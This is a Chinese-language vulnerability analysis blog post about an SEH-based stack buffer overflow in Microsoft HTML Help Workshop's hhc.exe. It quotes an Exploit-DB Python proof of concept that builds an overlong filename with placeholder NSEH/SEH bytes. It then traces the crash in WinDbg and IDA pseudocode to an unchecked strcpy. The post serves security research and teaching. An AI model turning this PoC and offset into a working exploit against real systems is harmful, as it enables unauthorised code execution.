---
layout: post
title: "漏洞说明"
date: 2020-02-10 21:24:34 +0800
permalink: "/post/HTML Help Workshop .SEH本地代码执行漏洞/"
---

作者：k0shl 转载请注明出处：https://whereisk0shl.top

- - - - --

### 漏洞说明

- - - - --

软件下载：
https://www.exploit-db.com/apps/53899be5da83419d772d5b97e653da7c-htmlhelp.exe

PoC:
```

# Exploit Title: HTML Help Workshop - (SEH) Buffer Overflow                                          #
# Date: August 24 2014                                                                               #
# Exploit Author: Moroccan Kingdom (MKD)                                                             #
# Software Link: http://msdn.microsoft.com/en-us/library/windows/desktop/ms669985%28v=vs.85%29.aspx  #                                     #
# Version: 1.4                                                                                       #
# Tested on: Windows XP SP3/SP2 | Windows 7 64/32-bit  (eng)                                         #

 
import subprocess,time
import sys,os
 
if os.name == "nt" :
   subprocess.call('cls', shell=True)
   os.system("color c")
else :
   subprocess.call('clear', shell=True)
 
time.sleep(1)
 
print '''
///////////////////////////////////////////////////////////////////////////////
/                               M.O.R.O.C.C.A.N                               /
/                                K.I.N.G.D.O.M                                /
/                                    [MKD]                                    /
/ CONTACT US : facebook.com/moroccankingdom024 | twitter.com/moroccankingdom  /
/ To run this exploit Go to DOS and then go to the folder path program and    /
/ run this command : hc | exm : hcc.exe AAAABBBCCCSSS...           /
/////////////////////////////////////////////////////////////////////////////// '''
 
JNK = "A" * 284
NEH = "B" * 4                  
SEH = "C" * 4               
SHL = "S" * 400
 
POC = JNK + NEH + SEH + SHL
 
try :
   file = open("poc.txt", "w")
   file.write(POC)
   file.close()
   print "\n[*] file created successfully"
except:
   print "[#] error to create file"
  
close = raw_input("\n[!] press any button to close()")
```


- - - - -

### 漏洞复现

-----------------------------------------------------

HHC.exe是微软用于生成html帮助文档的工具，在HHC中处理生成帮助文档文件名时，由于对文件名检查不严格，而直接传入缓冲区，导致可以利用畸形文件名使某个关键指针被覆盖，导致在执行strcpy的过程中产生异常，再通过SEH指针覆盖导致任意代码执行，下面对此漏洞进行详细分析。

首先，通过hhc命令执行帮助文档生成操作，加载畸形文件名，hhc崩溃，附加调试器，到达崩溃现场。

```
(110.5a8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000207 ebx=009127e4 ecx=00000017 edx=0012fe58 esi=009129c0 edi=00130000
eip=00401176 esp=0012fe48 ebp=0012ff80 iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010207
*** ERROR: Module load completed but symbols could not be loaded for hhc.exe
hhc+0x1176:
00401176 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
0:000> dd esi
009129c0  53535353 53535353 53535353 53535353
009129d0  53535353 53535353 53535353 53535353
009129e0  53535353 53535353 53535353 53535353
009129f0  53535353 53535353 53535353 53535353
00912a00  53535353 53535353 53535353 53535353
00912a10  53535353 53535353 53535353 ba005353
00912a20  abababab abababab 00000000 00000000
00912a30  004b0103 00180767 0040b210 0040b230
```

可以看到，程序中断在一处rep movs指令上，这个指令通常是进行缓冲区拷贝的敏感指令，此时edi是一处不可读的地址，接下来看一下堆栈调用。

```
0:000> kb
ChildEBP RetAddr  Args to Child              
WARNING: Stack unwind information not available. Following frames may be wrong.
0012ff80 53535353 53535353 53535353 53535353 hhc+0x1176
0012ff84 53535353 53535353 53535353 53535353 0x53535353
0012ff88 53535353 53535353 53535353 53535353 0x53535353
0012ff8c 53535353 53535353 53535353 53535353 0x53535353
0012ff90 53535353 53535353 53535353 53535353 0x53535353
0012ff94 53535353 53535353 53535353 53535353 0x53535353
0012ff98 53535353 53535353 53535353 53535353 0x53535353
0012ff9c 53535353 53535353 53535353 53535353 0x53535353
0012ffa0 53535353 53535353 53535353 53535353 0x53535353
```

可以看到堆栈调用部分已经被畸形字符串填充，堆栈被破坏，接下来继续执行。

```
0:000> g
(110.5a8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=43434343 edx=7c9232bc esi=00000000 edi=00000000
eip=43434343 esp=0012fa78 ebp=0012fa98 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
43434343 ??              ???
```

由于刚才esi是不可读的地址，触发了SEH异常处理机制，由于SEH指针也被畸形字符串覆盖了，导致程序跳转到43434343这个不可读的地址位置，由于堆栈被破坏，只能从栈顶的hhc调用位置入手回溯分析。

----------------------------------------------------

### 漏洞分析

----------------------------------------------------

在追溯到栈顶调用位置的时候，我发现这个调用位置正好处于main函数中。

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  const char **v3; // ebx@2
  char v4; // al@2
  int v5; // edi@4
  char *v7; // [sp-10h] [bp-144h]@16
  int (__stdcall *v8)(char *); // [sp-Ch] [bp-140h]@16
  int (__stdcall *v9)(int); // [sp-8h] [bp-13Ch]@16
  char v10; // [sp+Ch] [bp-128h]@11
  int v11; // [sp+110h] [bp-24h]@5
  int v12; // [sp+130h] [bp-4h]@5
```

从这个main函数入手，分析这个漏洞为什么会产生，首先直接在main函数入口处下断点。

```
(45c.6e0): Break instruction exception - code 80000003 (first chance)
eax=00241eb4 ebx=7ffd6000 ecx=00000002 edx=00000004 esi=00241f48 edi=00241eb4
eip=7c92120e esp=0012fb20 ebp=0012fc94 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for ntdll.dll - 
ntdll!DbgBreakPoint:
7c92120e cc              int     3
0:000> bp 00401013
*** ERROR: Module load completed but symbols could not be loaded for hhc.exe
0:000> g
ModLoad: 76300000 7631d000   C:\windows\system32\IMM32.DLL
ModLoad: 62c20000 62c29000   C:\windows\system32\LPK.DLL
ModLoad: 73fa0000 7400b000   C:\windows\system32\USP10.dll
ModLoad: 77180000 77283000   C:\windows\WinSxS\x86_Microsoft.Windows.Common-
Controls_6595b64144ccf1df_6.0.2600.5512_x-ww_35d4ce83\comctl32.dll
Breakpoint 0 hit
eax=00000002 ebx=7ffd6000 ecx=0000594c edx=7c92e4f4 esi=007eba02 edi=00ecf554
eip=00401013 esp=0012ff84 ebp=0012ffc0 iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
hhc+0x1013:
00401013 b808844000      mov     eax,offset hhc+0x8408 (00408408)
```

00401013就是main函数的入口点，接下来单步调试。

```
0:000> p
eax=0040101d ebx=7ffd6000 ecx=0000594c edx=7c92e4f4 esi=007eba02 edi=00ecf554
eip=00401030 esp=0012fe4c ebp=0012ff80 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
hhc+0x1030:
00401030 8b5d0c          mov     ebx,dword ptr [ebp+0Ch] ss:0023:0012ff8c=009127e0
0:000> dd poi(ebp+0c)
009127e0  009127ec 00912818 00000000 505c3a43
009127f0  72676f72 46206d61 73656c69 4d54485c
00912800  6548204c 5720706c 736b726f 5c706f68
00912810  2e636868 00657865 41414141 41414141
00912820  41414141 41414141 41414141 41414141
00912830  41414141 41414141 41414141 41414141
00912840  41414141 41414141 41414141 41414141
00912850  41414141 41414141 41414141 41414141
```

在00401030位置执行了一次mov ebx，[ebp+0ch]的操作，这个是将第二个参数的值传给ebx，ebx将保存一个指针，单步步过，来看一下ebx的值。

```
0:000> p
eax=0040101d ebx=009127e0 ecx=0000594c edx=7c92e4f4 esi=007eba02 edi=00ecf554
eip=00401033 esp=0012fe4c ebp=0012ff80 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
hhc+0x1033:
00401033 83c304          add     ebx,4
0:000> dd ebx
009127e0  009127ec 00912818 00000000 505c3a43
009127f0  72676f72 46206d61 73656c69 4d54485c
00912800  6548204c 5720706c 736b726f 5c706f68
00912810  2e636868 00657865 41414141 41414141
00912820  41414141 41414141 41414141 41414141
00912830  41414141 41414141 41414141 41414141
00912840  41414141 41414141 41414141 41414141
00912850  41414141 41414141 41414141 41414141
```

可以看到ebx现在存放的是畸形文件名了，接下来继续单步执行。

```
0:000> p
ModLoad: 5adc0000 5adf7000   C:\windows\system32\uxtheme.dll
ModLoad: 74680000 746cc000   C:\windows\system32\MSCTF.dll
eax=00000000 ebx=009127e4 ecx=76ab67f0 edx=76ab67f0 esi=007eba02 edi=00000000
eip=00401053 esp=0012fe4c ebp=0012ff80 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
hhc+0x1053:
00401053 68e0b04000      push    offset hhc+0xb0e0 (0040b0e0)
0:000> p
eax=00000000 ebx=009127e4 ecx=76ab67f0 edx=76ab67f0 esi=007eba02 edi=00000000
eip=00401058 esp=0012fe48 ebp=0012ff80 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
hhc+0x1058:
00401058 ff33            push    dword ptr [ebx]      ds:0023:009127e4=00912818
0:000> p
eax=00000000 ebx=009127e4 ecx=76ab67f0 edx=76ab67f0 esi=007eba02 edi=00000000
eip=0040105a esp=0012fe44 ebp=0012ff80 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
hhc+0x105a:
0040105a e88d730000      call    hhc+0x83ec (004083ec)
```

到达0040105a位置会执行一个call调用，之前会push两个参数入栈，可以看到call调用函数的第一个参数是ebx指针，里面存放的是畸形字符串，而第二个参数一会会提到，来看一下第一个参数。

```
0:000> dd esp
0012fe44  00912818 0040b0e0 00ecf554 007eba02
0012fe54  7ffd6000 7c947553 00140000 40000060
0012fe64  7c00003d 0012ff64 0012fdb0 7ffd6000
0012fe74  0012ff44 7c92e900 7c947768 ffffffff
0012fe84  7c947764 7c947553 00910000 40000060
0012fe94  7c93003d 00db0792 00912338 00db0214
0012fea4  7c9301c0 ffffffff 7c9301bb 7c932cae
0012feb4  7c932ce4 7c932d51 7c932d58 00000056
0:000> dd poi(esp)
00912818  41414141 41414141 41414141 41414141
00912828  41414141 41414141 41414141 41414141
00912838  41414141 41414141 41414141 41414141
00912848  41414141 41414141 41414141 41414141
00912858  41414141 41414141 41414141 41414141
00912868  41414141 41414141 41414141 41414141
```

已经是畸形字符串了，那么这个位置的call调用是怎么一回事呢，来通过IDA看一下这段的伪代码。

```
    if ( HHA_1((int)*v3, (int)a_htm) )
      {
        HHA_68(&v11, "hhctest.hhp", 0x8000, 0);
        v12 = 0;
        if ( v11 == -1 )
        {
          printf(aCannotOpenHhct);
          exit(-1);
        }
        HHA_67(&v11, aFiles);
        HHA_67(&v11, *v3);
        v12 = -1;
        HHA_64(&v11);
        v5 = HHA_CompileHHP("hhctest.hhp", std::allocator<char>::allocate, sub_40100D, 0);
        DeleteFileA("hhctest.hhp");
      }
      else if ( HHA_1((int)*v3, (int)a_hhm) )
      {
        HHA_30(&v11, *v3);
        v12 = 1;
        if ( v11 != -1 )
        {
          while ( HHA_32(&v11, &v10) )
          {
            HHA_315(*v3, &v10, 0);
            HHA_CompileHHP(&v10, std::allocator<char>::allocate, sub_40100D, 0);
          }
          v5 = 1;
        }
        v12 = -1;
        HHA_31(&v11);
      }
```

可以看到，这里执行的是HHA_1函数，实际上，这个函数是HHA.dll中的一个函数，是专门用于生成帮助文档的，这里会进行两次if语句的条件判断。

其中a_htm的值是htm，而a_hhm的值是hhm，这个HHA_1函数是什么作用呢？通过反编译system32下的HHA.dll可以很清晰的了解到这个函数的功能。

```
const CHAR *__stdcall HHA_1(LPCSTR lpsz, PCNZCH lpString2)
{
  const CHAR *v2; // esi@1
  char v3; // dl@1
  int v4; // edi@1
  CHAR v5; // bl@2
  CHAR v6; // bl@8
  LPCSTR lpsza; // [sp+14h] [bp+4h]@1

  v2 = lpsz;
  v3 = (unsigned int)CharLowerA((LPSTR)*lpString2);
  v4 = strlen(lpString2);
  lpsza = (LPCSTR)v3;
  if ( dword_4537F65C )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        v5 = *v2;
        if ( (LPCSTR)(unsigned __int8)CharLowerA((LPSTR)*v2) == lpsza || !v5 )
          break;
        v2 = CharNextA(v2);
      }
      if ( !*v2 )
        break;
      if ( CompareStringA(Locale, 1u, v2, v4, lpString2, v4) == 2 )
        return v2;
      v2 = CharNextA(v2);
    }
  }
  else
  {
    while ( 1 )
    {
      while ( 1 )
      {
        v6 = *v2;
        if ( (LPCSTR)(unsigned __int8)CharLowerA((LPSTR)*v2) == lpsza || !v6 )
          break;
        ++v2;
      }
      if ( !*v2 )
        break;
      if ( CompareStringA(Locale, 1u, v2, v4, lpString2, v4) == 2 )
        return v2;
      ++v2;
    }
  }
  return 0;
}
```

可以看到，这个函数的主要功能就是将第一个参数和第二个参数进行匹配，如果匹配上了，则返回参数，如果没有匹配上，则返回0，第一个参数就是畸形字符串，很明显没有匹配上。通过动态跟踪可以看到这个过程。

```
0:000> p
eax=00000000 ebx=009127e4 ecx=00000000 edx=7ffb0000 esi=007eba02 edi=00000000
eip=0040105f esp=0012fe4c ebp=0012ff80 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
hhc+0x105f:
0040105f 85c0            test    eax,eax
0:000> p
eax=00000000 ebx=009127e4 ecx=00000000 edx=7ffb0000 esi=007eba02 edi=00000000
eip=00401061 esp=0012fe4c ebp=0012ff80 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
hhc+0x1061:
00401061 7474            je      hhc+0x10d7 (004010d7)                   [br=1]
0:000> p
eax=00000000 ebx=009127e4 ecx=00000000 edx=7ffb0000 esi=007eba02 edi=00000000
eip=004010d7 esp=0012fe4c ebp=0012ff80 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
hhc+0x10d7:
004010d7 68b8b04000      push    offset hhc+0xb0b8 (0040b0b8)
0:000> p
eax=00000000 ebx=009127e4 ecx=00000000 edx=7ffb0000 esi=007eba02 edi=00000000
eip=004010dc esp=0012fe48 ebp=0012ff80 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
hhc+0x10dc:
004010dc ff33            push    dword ptr [ebx]      ds:0023:009127e4=00912818
0:000> p
eax=00000000 ebx=009127e4 ecx=00000000 edx=7ffb0000 esi=007eba02 edi=00000000
eip=004010de esp=0012fe44 ebp=0012ff80 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
hhc+0x10de:
004010de e809730000      call    hhc+0x83ec (004083ec)
```

0040105f地址位置对eax进行了一次是否为0判断，如果为0，则会在je指令处跳转，在004010de会再次调用HHA_1，很明显，这里就是刚才伪代码中第二次判断，显然，畸形字符串也不包含hhm的字段，因此仍然检测不通过，返回为0。

```
0:000> dd poi(esp)
00912818  41414141 41414141 41414141 41414141
00912828  41414141 41414141 41414141 41414141
00912838  41414141 41414141 41414141 41414141
00912848  41414141 41414141 41414141 41414141
00912858  41414141 41414141 41414141 41414141
00912868  41414141 41414141 41414141 41414141
00912878  41414141 41414141 41414141 41414141
00912888  41414141 41414141 41414141 41414141
0:000> dc poi(esp+4)
0040b0b8  6d68682e 00000000 4c49465b 005d5345  .hhm....[FILES].
0040b0c8  6e6e6143 6f20746f 206e6570 74636868  Cannot open hhct
0040b0d8  2e747365 00706868 6d74682e 00000000  est.hhp..htm....
0040b0e8  00000000 00000a28 00000501 00000005  ....(...........
0040b0f8  00000001 00000002 009127e0 00000000  .........'......
0040b108  00db01a0 00db01a0 00000000 00000000  ................
0040b118  0040d090 00000000 00000000 00000000  ..@.............
0040b128  00000000 19930520 00000000 00000000  .... ...........
0:000> p
eax=00000000 ebx=009127e4 ecx=00000000 edx=7ffb0000 esi=007eba02 edi=00000000
eip=004010e3 esp=0012fe4c ebp=0012ff80 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
hhc+0x10e3:
004010e3 85c0            test    eax,eax
0:000> p
eax=00000000 ebx=009127e4 ecx=00000000 edx=7ffb0000 esi=007eba02 edi=00000000
eip=004010e5 esp=0012fe4c ebp=0012ff80 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
hhc+0x10e5:
004010e5 7461            je      hhc+0x1148 (00401148)                   [br=1]
```

这里检测仍然不通过，到达后面的步骤继续执行。

```
0:000> p
eax=00000000 ebx=009127e4 ecx=00000000 edx=7ffb0000 esi=007eba02 edi=00000000
eip=00401153 esp=0012fe4c ebp=0012ff80 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
hhc+0x1153:
00401153 754b            jne     hhc+0x11a0 (004011a0)                   [br=0]
0:000> p
eax=00000000 ebx=009127e4 ecx=00000000 edx=7ffb0000 esi=007eba02 edi=00000000
eip=00401155 esp=0012fe4c ebp=0012ff80 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
hhc+0x1155:
00401155 8b3b            mov     edi,dword ptr [ebx]  ds:0023:009127e4=00912818
0:000> p
eax=00000000 ebx=009127e4 ecx=00000000 edx=7ffb0000 esi=007eba02 edi=00912818
eip=00401157 esp=0012fe4c ebp=0012ff80 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
hhc+0x1157:
00401157 83c9ff          or      ecx,0FFFFFFFFh
0:000> dd edi
00912818  41414141 41414141 41414141 41414141
00912828  41414141 41414141 41414141 41414141
00912838  41414141 41414141 41414141 41414141
00912848  41414141 41414141 41414141 41414141
00912858  41414141 41414141 41414141 41414141
00912868  41414141 41414141 41414141 41414141
00912878  41414141 41414141 41414141 41414141
00912888  41414141 41414141 41414141 41414141
```

可以看到这里，将ebx指针内容交给edi，这时查看edi的值已经是畸形字符串，关注edi寄存器，继续单步执行。

```
0:000> p
eax=00000207 ebx=009127e4 ecx=00000207 edx=0012fe58 esi=007eba02 edi=00912818
eip=0040116f esp=0012fe48 ebp=0012ff80 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
hhc+0x116f:
0040116f 8bf7            mov     esi,edi
0:000> p
eax=00000207 ebx=009127e4 ecx=00000207 edx=0012fe58 esi=00912818 edi=00912818
eip=00401171 esp=0012fe48 ebp=0012ff80 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
hhc+0x1171:
00401171 8bfa            mov     edi,edx
0:000> p
eax=00000207 ebx=009127e4 ecx=00000207 edx=0012fe58 esi=00912818 edi=0012fe58
eip=00401173 esp=0012fe48 ebp=0012ff80 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
hhc+0x1173:
00401173 c1e902          shr     ecx,2
0:000> p
eax=00000207 ebx=009127e4 ecx=00000081 edx=0012fe58 esi=00912818 edi=0012fe58
eip=00401176 esp=0012fe48 ebp=0012ff80 iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
hhc+0x1176:
00401176 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
```

在0040116f位置执行了一次值传递，然后就到达rep movs漏洞位置，这时esi指针指向畸形字符串，向edi拷贝大量数据，当超过edi指针指向内存可写范围时，会进入readonly内存空间，导致向不可写内存写入数据引发seh异常，最后覆盖seh handler导致代码执行。

```
0:000> p
(45c.6e0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000207 ebx=009127e4 ecx=00000017 edx=0012fe58 esi=009129c0 edi=00130000
eip=00401176 esp=0012fe48 ebp=0012ff80 iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010207
hhc+0x1176:
00401176 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
0:000> g
(45c.6e0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=43434343 edx=7c9232bc esi=00000000 edi=00000000
eip=43434343 esp=0012fa78 ebp=0012fa98 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
43434343 ??              ???
```

看一下这块的伪代码。

```
      else
      {
        if ( HHA_8(*v3, 46) )
        {
          v9 = sub_40100D;
          v8 = std::allocator<char>::allocate;
          v7 = (char *)*v3;
        }
        else
        {
          strcpy(&v10, *v3);
```

在之前的伪代码中，两个if语句都没有执行，到达esle内部逻辑，紧接着HHA_8条件判断没有通过，到达strcpy的位置，由于没有对v3指针指向数据的长度进行检查，导致超长字符串覆盖v10进入不可写位置，导致seh异常的触发。

感谢文章读者Xxxx指出的错误。
